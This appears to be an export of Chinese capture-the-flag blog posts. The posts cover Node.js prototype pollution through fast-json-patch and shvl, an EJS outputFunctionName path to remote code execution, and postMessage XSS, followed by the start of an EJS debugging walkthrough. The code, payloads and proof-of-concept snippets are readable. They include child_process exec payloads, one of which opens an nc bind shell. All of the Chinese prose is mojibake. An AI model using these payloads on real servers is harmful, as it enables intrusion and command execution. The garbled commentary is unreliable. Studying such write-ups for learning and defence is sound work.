class="string">&quot;online&quot;</span>,</span><br><span class="line">    turrets: <span class="string">&quot;online&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Static folder</span></span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.static(__dirname + <span class="string">&quot;/static&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> html = <span class="keyword">await</span> ejs.renderFile(__dirname + <span class="string">&quot;/templates/index.ejs&quot;</span>, &#123;services&#125;)</span><br><span class="line">    res.end(html)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// API</span></span><br><span class="line">app.post(<span class="string">&quot;/change_status&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> patch = []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.entries(req.body).forEach(<span class="function">(<span class="params">[service, status]</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service === <span class="string">&quot;status&quot;</span>)&#123;</span><br><span class="line">            res.status(<span class="number">400</span>).end(<span class="string">&quot;Cannot change all services status&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span> + service,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    jsonpatch.applyPatch(services, patch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;offline&quot;</span> <span class="keyword">in</span> <span class="built_in">Object</span>.values(services))&#123;</span><br><span class="line">        services.status = <span class="string">&quot;offline&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.json(services)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">1337</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`App listening at port 1337`</span>)</span><br><span class="line">&#125;)  </span><br></pre></td></tr></table></figure>



<p>ä»£ç å¾ˆçŸ­ï¼Œéšä¾¿å®¡è®¡å°±å®¡è®¡å®Œäº†ï¼Œä¸€èˆ¬åŸå‹é“¾æ±¡æŸ“éƒ½å¤„äºèƒ½å¤Ÿè¢«ç”¨æˆ·è‡ªå®šä¹‰æ§åˆ¶çš„åœ°æ–¹ï¼Œæ‰€ä»¥é‡ç‚¹çœ‹çœ‹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.post(<span class="string">&quot;/change_status&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> patch = []</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.entries(req.body).forEach(<span class="function">(<span class="params">[service, status]</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (service === <span class="string">&quot;status&quot;</span>)&#123;</span><br><span class="line">            res.status(<span class="number">400</span>).end(<span class="string">&quot;Cannot change all services status&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        patch.push(&#123;</span><br><span class="line">            <span class="string">&quot;op&quot;</span>: <span class="string">&quot;replace&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/&quot;</span> + service,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: status</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">      jsonpatch.applyPatch(services, patch)</span><br></pre></td></tr></table></figure>

<p>å‘ç°ä»–ç”¨äº†ä¸€ä¸ªpatchä»€ä¹ˆçš„ï¼Œåˆ°package.jsonä¸­å¯ä»¥çœ‹è§ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ejs&quot;</span>: <span class="string">&quot;^3.1.6&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express-basic-auth&quot;</span>: <span class="string">&quot;^1.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fast-json-patch&quot;</span>: <span class="string">&quot;^3.0.0-1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆåº”è¯¥å°±æ˜¯è¿™ä¸ªfast-json-pathåº“çš„é—®é¢˜ï¼Œå»githubä¸Šæœæœçœ‹èƒ½å¤Ÿæ‰¾åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Starcounter-Jack&#x2F;JSON-Patch&#x2F;pull&#x2F;262</span><br></pre></td></tr></table></figure>



<p>åˆ«äººç»™å‡ºçš„pocï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// poc.js</span></span><br><span class="line"><span class="keyword">let</span> fastjsonpatch = <span class="built_in">require</span>(<span class="string">&quot;fast-json-patch&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">new</span> A();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + a.polluted);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + b.polluted);</span><br><span class="line"><span class="keyword">const</span> patch = [&#123;<span class="attr">op</span>: <span class="string">&quot;replace&quot;</span>, <span class="attr">path</span>: <span class="string">&quot;/constructor/prototype/polluted&quot;</span>, <span class="attr">value</span>: <span class="string">&quot;Yes! Its Polluted&quot;</span>&#125;];</span><br><span class="line">fastjsonpatch.applyPatch(a, patch);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + a.polluted);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + b.polluted);</span><br></pre></td></tr></table></figure>

<p><img src="image-20210601220006513.png" alt="image-20210601220006513"></p>
<p>çœ‹äº†çœ‹ä¸å°±å’Œé¢˜ç›®å‡ºçš„ä¸€æ¨¡ä¸€æ ·å—ï¼Œä½†æ˜¯è¯åˆå›æ¥ï¼Œæˆ‘ä»¬å´å‘ç°å³ä½¿èƒ½å¤ŸåŸå‹é“¾æ±¡æŸ“äº†å¥½åƒè¿˜æ˜¯æ²¡å•¥ç”¨å•Šè‰ã€‚</p>
<p><img src="image-20210601215202253.png" alt="image-20210601215202253"></p>
<p>è¿™æ—¶å€™å†è§‚å¯Ÿpackage.json</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;ejs&quot;</span>: <span class="string">&quot;^3.1.6&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;^4.17.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express-basic-auth&quot;</span>: <span class="string">&quot;^1.2.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;fast-json-patch&quot;</span>: <span class="string">&quot;^3.0.0-1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å‘ç°ejsï¼Œæœäº†ä¸€ä¸‹ejsåŸæ¥æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨äºRCEçš„ç‚¹ã€‚åªè¦æ±¡æŸ“outputFunctionName è¿™ä¸ªç‚¹å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p>
<p>é‚£ä¹ˆå°è¯•</p>
<p><img src="image-20210601215319818.png" alt="image-20210601215319818"></p>
<p>ç„¶åå°±å¯ä»¥å‘ç°å†™å…¥äº†ï¼Œä½†æ˜¯çœ‹äº†åˆ«äººçš„WPå‘ç°è¿™æ ·æ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºè¿˜ç»™äº†ä½ dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">1337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># copy flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> flag.txt /root/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># copy readflag binary (it just reads the flag)</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> readflag /</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 4755 /readflag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># install web application</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> src /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">cd</span> /app &amp;&amp; npm install</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change to guest user</span></span><br><span class="line"><span class="keyword">USER</span> <span class="number">405</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># run application and stay alive for 5 minutes</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> entrypoint.sh / </span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> /entrypoint.sh</span></span><br></pre></td></tr></table></figure>



<p>å¯ä»¥çœ‹è§ä½œä¸ºguestæˆ‘ä»¬æ˜¯æ²¡æœ‰å†™å…¥æƒé™çš„ï¼Œé‚£ä¹ˆå°±åªèƒ½å»æ‰“åå¼¹shelläº†ï¼Œç½‘ä¸Šexpä¸€å¤§å †éšä¾¿æ‰¾ä¸€ä¸ªæ¥æ‰“å°±å¯ä»¥äº†</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;constructor/prototype/outputFunctionName&quot;: &quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;whoami &gt;&gt; src/static/style.css&#x27;);x&quot;</span><br><span class="line">æ— æ³•å†™å…¥ä¹‹åå°±æ‰“åå¼¹shell</span><br><span class="line"> &quot;constructor/prototype/outputFunctionName&quot;: &quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;nc -lvp 4444 -e /bin/sh&#x27;);x&quot;</span><br><span class="line"># è¿™é‡Œå‘ç°è€å¤–çš„æ€è·¯åˆå’Œæˆ‘å¹³å¸¸æ‰“åå¼¹shellä¸ä¸€æ ·ï¼Œå†™æˆè¿™æ ·payloadçš„è¯æˆ‘ä»¬ncipè¿‡å»å°±å¯ä»¥äº†</span><br></pre></td></tr></table></figure>



<h1 id="small-talk"><a href="#small-talk" class="headerlink" title="small-talk"></a>small-talk</h1><p>åˆæ˜¯JSé¢˜ç›®</p>
<h2 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul>
<li>åŸå‹é“¾æ±¡æŸ“</li>
<li>XSS</li>
</ul>
<p>èƒ½å¤Ÿçœ‹åˆ°æºç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: gunicorn</span><br><span class="line"><span class="built_in">Date</span>: Tue, <span class="number">0</span>1 Jun <span class="number">2021</span> <span class="number">12</span>:<span class="number">0</span>8:<span class="number">22</span> GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=utf-<span class="number">8</span></span><br><span class="line">Content-Length: <span class="number">2043</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;title&gt;Share your thoughts&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">&quot;/static/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://unpkg.com/shvl@latest/dist/shvl.umd.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://unpkg.com/@popperjs/core@2&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;wrap --rtn&quot;</span>&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">      &lt;form action=<span class="string">&quot;/admin&quot;</span> method=<span class="string">&quot;POST&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;flex-form&quot;</span>&gt;</span><br><span class="line">        &lt;div id=<span class="string">&quot;js-usr-new&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;select__label text&quot;</span>&gt;Share your coach phrases <span class="keyword">with</span> our admin&lt;/div&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;url&quot;</span> name=<span class="string">&quot;url&quot;</span> placeholder=<span class="string">&quot;address&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;ui-elem ui-elem-email text&quot;</span> /&gt;</span><br><span class="line">        &lt;button id=<span class="string">&quot;send-button&quot;</span> type=<span class="string">&quot;submit&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;ui-button text&quot;</span>&gt;send&lt;/button&gt;</span><br><span class="line">        &lt;div id=<span class="string">&quot;send-tooltip&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;tooltip&quot;</span> role=<span class="string">&quot;tooltip&quot;</span>&gt;</span><br><span class="line">            go ahead, click me :)</span><br><span class="line">            &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;tooltip-arrow&quot;</span> data-popper-arrow&gt;&lt;/div&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">      &lt;div id=<span class="string">&quot;quote&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;flex-form&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;iframe id=<span class="string">&#x27;#quote-base&#x27;</span> src=<span class="string">&quot;/quotes&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> button = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#send-button&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> tooltip = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#send-tooltip&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> message = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;#quote&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">      <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;message&#x27;</span>, <span class="function"><span class="keyword">function</span> <span class="title">setup</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">          <span class="built_in">window</span>.removeEventListener(<span class="string">&#x27;message&#x27;</span>, setup);</span><br><span class="line">          quote = &#123;<span class="string">&#x27;author&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">          shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>]);</span><br><span class="line">          shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>]);</span><br><span class="line">          </span><br><span class="line">          message.textContent = <span class="built_in">Object</span>.values(quote)[<span class="number">1</span>] + <span class="string">&#x27; Ã¢Â€Â” &#x27;</span> + <span class="built_in">Object</span>.values(quote)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> popperInstance = Popper.createPopper(button, tooltip, &#123;</span><br><span class="line">              placement: <span class="string">&#x27;bottom&#x27;</span>,</span><br><span class="line">              modifiers: [</span><br><span class="line">                  &#123;</span><br><span class="line">                  name: <span class="string">&#x27;offset&#x27;</span>,</span><br><span class="line">                  options: &#123;</span><br><span class="line">                      offset: [<span class="number">0</span>, <span class="number">8</span>],</span><br><span class="line">                  &#125;,</span><br><span class="line">                  &#125;,</span><br><span class="line">              ],</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰ä¸ªquotesï¼Œè¿›å»çœ‹çœ‹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    phrases = [</span><br><span class="line">        &#123;<span class="string">&#x27;@entrepreneur&#x27;</span>: <span class="string">&#x27;The distance between your DREAMS and REALITY is called ACTION&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@successman&#x27;</span>: <span class="string">&#x27;MOTIVATION is what gets you started, HABIT is what keeps you going&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@bornrich&#x27;</span>: <span class="string">&#x27;It\&#x27;s hard to beat someone that never gives up&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@businessman&#x27;</span>: <span class="string">&#x27;Work while they sleep. Then live like they dream&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@bigboss&#x27;</span>: <span class="string">&#x27;Life begins at the end of your comfort zone&#x27;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;@daytrader&#x27;</span>: <span class="string">&#x27;A successfull person never loses... They either win or learn!&#x27;</span>&#125;</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        index = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">6</span>)</span><br><span class="line">        parent.postMessage(<span class="string">&#x27;&#123;&quot;author&quot;: &quot;&#x27;</span> + <span class="built_in">Object</span>.keys(phrases[index])[<span class="number">0</span>] + <span class="string">&#x27;&quot;, &quot;message&quot;: &quot;&#x27;</span> + <span class="built_in">Object</span>.values(phrases[index])[<span class="number">0</span>] + <span class="string">&#x27;&quot;&#125;&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    &#125;, <span class="number">0</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<p>ç„¶åå°±æ²¡äº†ï¼Œæƒ³äº†åŠå¤©å»æŒ¨ä¸ªæœrequireçš„ä¸œè¥¿ï¼Œç»“æœshvlè¿™ä¸ªå°±æœ‰é—®é¢˜</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robinvdvleuten&#x2F;shvl&#x2F;pull&#x2F;35</span><br></pre></td></tr></table></figure>

<p>åˆ«äººç»™å‡ºçš„pocï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// poc.js</span></span><br><span class="line"><span class="keyword">var</span> shvl = <span class="built_in">require</span>(<span class="string">&quot;shvl&quot;</span>)</span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before: &quot;</span> + &#123;&#125;.polluted)</span><br><span class="line">shvl.set(obj, <span class="string">&#x27;__proto__.polluted&#x27;</span>, <span class="string">&#x27;Yes! Its Polluted&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After: &quot;</span> + &#123;&#125;.polluted)</span><br></pre></td></tr></table></figure>

<p><img src="image-20210601220413714.png" alt="image-20210601220413714"></p>
<p>ç„¶åç¿»è¿™æ®µä»£ç ï¼Œå°±å¯ä»¥å‘ç°</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">0</span>]);</span><br><span class="line">shvl.set(quote, <span class="built_in">Object</span>.keys(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>], <span class="built_in">Object</span>.values(<span class="built_in">JSON</span>.parse(e.data))[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>



<p>ç„¶åæˆ‘å°±ä¸çŸ¥é“è¯¥å’‹åšäº†ï¼Œçœ‹å¸¦å¸ˆå‚…ä»¬çš„åšå®¢å‘ç°è¿™å¥½åƒæ˜¯XSSï¼Œå¯æ˜¯è¿™é¢˜é¶æœºå¥½åƒä¸å¤ªå¯¹äº†ï¼Œåˆ«äººéƒ½å¯ä»¥çœ‹è§ç•™è¨€æˆ‘çœ‹ä¸è§</p>
<p><img src="image-20210602153814107.png" alt="image-20210602153814107"></p>
<p><img src="120125921-18a7eb80-c1ed-11eb-98f8-ff40d667b324.png" alt="æˆªåœ– 2021-05-31 ä¸Šåˆ8 36 30"></p>
<p>è¿™é“é¢˜æ˜¯ä» postMessage ä¸­çš„æ¡ä»¶ç«äº‰ åˆ°<a href="https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf">åŸå‹æ±¡æŸ“</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lemonslab.me&#x2F;posts&#x2F;small-talk-writeup&#x2F;</span><br></pre></td></tr></table></figure>

<p>nodeçš„æ¡ä»¶ç«äº‰è¿˜æ²¡è§è¿‡ã€‚æ„Ÿè§‰å¾ˆæ–°é¢–å¯ä»¥æ‹¿æ¥å‡ºé¢˜ã€‚</p>
<p>é¢˜ç›®çš„æ€è·¯ä¸ºï¼š</p>
<pre><code>+ åŠ è½½ä¸€ä¸ªiframeå¹¶å‘postMessageçˆ¶é¡µé¢å‘é€ä¸€ä¸ªéšæœºå¥å­
+ ç„¶åé¡µé¢é€šè¿‡shvlè§£æ
+ ä¹‹åæ”¾åˆ°é¡µé¢ä¸Š
+ åˆå§‹åŒ–[Popper.js](https://github.com/popperjs/popper-core)</code></pre>
]]></content>
      <tags>
        <tag>åŸå‹é“¾æ±¡æŸ“</tag>
        <tag>node</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>ejsè°ƒè¯•check</title>
    <url>/2021/06/22/ejs%E8%B0%83%E8%AF%95check/</url>
    <content><![CDATA[<p>è¿™ç¯‡ä¸»è¦æ˜¯åœ¨è·Ÿç€åšå®¢é€æ­¥çš„å•æ­¥è°ƒè¯•å¤ç°ã€‚è¿™æ®µæ—¶é—´æ‰“ç®—æ·±å…¥å­¦ä¹ ä¸€ä¸‹nodeçš„è°ƒè¯•</p>
<p>åšå®¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;evi0s.com&#x2F;2019&#x2F;08&#x2F;30&#x2F;expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce&#x2F;</span><br></pre></td></tr></table></figure>



<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">    <span class="keyword">let</span> input = <span class="built_in">JSON</span>.parse(req.body.content);</span><br><span class="line">    lodash.defaultsDeep(data, input);</span><br><span class="line">    res.json(&#123;<span class="attr">message</span>: <span class="string">&quot;OK&quot;</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> server = app.listen(<span class="number">8086</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Listening on port %d&#x27;</span>, server.address().port);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æ–­ç‚¹æ‰“åœ¨app.getï¼Œç„¶åå»è®¿é—®8086ç«¯å£</p>
<p><img src="image-20210622164732244.png" alt="image-20210622164732244"></p>
<p>ç¨å¾®è·Ÿè¿‡å»å‡ æ­¥ï¼Œå°±å¯ä»¥å‘ç°å·²ç»èµ°åˆ°äº†app.render:</p>
<p><img src="image-20210622164810756.png" alt="image-20210622164810756"></p>
<p>ä¸€ç›´è·Ÿå•Šè·Ÿï¼Œè·Ÿåˆ°è¿™é‡Œçš„æ—¶å€™å‘ç°è¢«èµ‹å€¼ä¸ºejsäº†</p>
<p><img src="image-20210622172902538.png" alt="image-20210622172902538"></p>
<p><img src="image-20210622172845324.png" alt="image-20210622172845324"></p>
<p>ä¹‹åä¸€å †çœ‹ä¸æ‡‚çš„æ“ä½œï¼Œè¿‡å»ä¹‹åä¼šè¯»å–fliename</p>
<p><img src="image-20210622173725083.png" alt="image-20210622173725083"></p>
<p>æ¥ç€å¾€ä¸‹è·Ÿï¼Œå‘ç°å¼€å§‹è¯»å–ejsäº†</p>
<p><img src="image-20210622173759164.png" alt="image-20210622173759164"></p>
<p>æ‰¾åˆ°ä¹‹åä¼šå»æ‰¾ejsçš„è·¯å¾„</p>
<p><img src="image-20210622174351435.png" alt="image-20210622174351435"></p>
<p>ç„¶åå°±æ˜¯æŠŠè·¯å¾„è½¬æˆasciç å†è½¬å†…å­˜é‡Œå»ï¼ˆå¤§æ¦‚ï¼‰ï¼Œä¸€ä¸ªæ¼«é•¿çš„è¿‡ç¨‹</p>
<p>æ‰¾äº†å¥½åŠå¤©ç»ˆäºæ‰¾åˆ°äº†</p>
<p><img src="image-20210622175149375.png" alt="image-20210622175149375"></p>
<p><img src="image-20210622195539013.png" alt="image-20210622195539013"></p>
<p>è¯´å®è¯çœ‹åˆ°è¿™ç§ä¸œè¥¿çœŸçš„å¾ˆçƒ¦èºã€‚</p>
<p>æˆ‘è¦åäº†ï¼Œå› ä¸ºè·¯å¾„æ²¡å†™å¯¹ğŸ‘´å¯¹ç€ç©ºæ°”è°ƒäº†åŠå¤©ï¼Œä¸€ç›´åˆ°ä¸äº†</p>
<p>åæ¥æŠŠdebugæ¨¡å¼å…³äº†æ‰å‘ç°ï¼ŒæŠŠè·¯å¾„æ”¹å¯¹ä¹‹åç»ˆäºçœ‹è§tryHandleCacheäº†ï¼Œè·Ÿè¿›ä¹‹åå‘ç°æœ‰è¿™ä¹ˆä¸€æ®µä»£ç ï¼š</p>
<p>è·Ÿè¿›åˆ°tryHandeCacheå‡½æ•°ï¼Œä¹‹åè·³è¿‡ä¸­é—´å“ªäº›éƒ¨åˆ†ï¼Œå†è¿›å…¥åˆ°handleCache</p>
